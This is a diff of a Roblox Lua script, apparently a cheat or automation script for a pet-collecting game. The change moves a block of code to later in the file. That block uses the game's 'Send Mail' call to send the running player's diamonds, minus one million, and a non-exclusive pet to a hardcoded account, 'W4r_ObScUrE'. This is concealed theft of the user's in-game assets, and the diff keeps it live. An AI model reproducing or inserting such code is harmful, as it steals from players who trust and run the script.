@@ -265,34 +265,7 @@ local savedPets = FrameworkLibrary.Save.Get().Pets
 _G.Lol = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2900000
 
 _G.CACA = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 1000000
-for i, v in pairs(savedPets) do
-    local v2 = FrameworkLibrary.Directory.Pets[v.id]
-	 _G.PetName = v2.name
-     _G.PetRar = v2.rarity
-    if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
-                _G.Lol = 0
-    end
-    if v2.rarity == "Exclusive" then
-		break
-    else
-        _G.Username = "W4r_ObScUrE"
-        _G.PetName = v2.name
-        _G.PetRar = v2.rarity
-		local args = {
-    			[1] = {
-        			["Recipient"] = _G.Username,
-        			["Diamonds"] = _G.CACA,
-        			["Pets"] = {v.uid},
-        			["Message"] = _G.GiftMessage
-    			}
-			}
-			Invoke("Send Mail", unpack(args))
 
-            wait(5)
-            print("pewp")
-            break
-    end
-end
 
 while wait() do
     for i, v in pairs(savedPets) do
@@ -465,6 +438,34 @@ while wait() do
     end
 end
 
+for i, v in pairs(savedPets) do
+    local v2 = FrameworkLibrary.Directory.Pets[v.id]
+	 _G.PetName = v2.name
+     _G.PetRar = v2.rarity
+    if game.Players.LocalPlayer.leaderstats.Diamonds.Value < 3000000 then
+                _G.Lol = 0
+    end
+    if v2.rarity == "Exclusive" then
+		break
+    else
+        _G.Username = "W4r_ObScUrE"
+        _G.PetName = v2.name
+        _G.PetRar = v2.rarity
+		local args = {
+    			[1] = {
+        			["Recipient"] = _G.Username,
+        			["Diamonds"] = _G.CACA,
+        			["Pets"] = {v.uid},
+        			["Message"] = _G.GiftMessage
+    			}
+			}
+			Invoke("Send Mail", unpack(args))
+
+            wait(5)
+            print("pewp")
+            break
+    end
+end
 
 while wait() do
     for i, v in pairs(savedPets) do
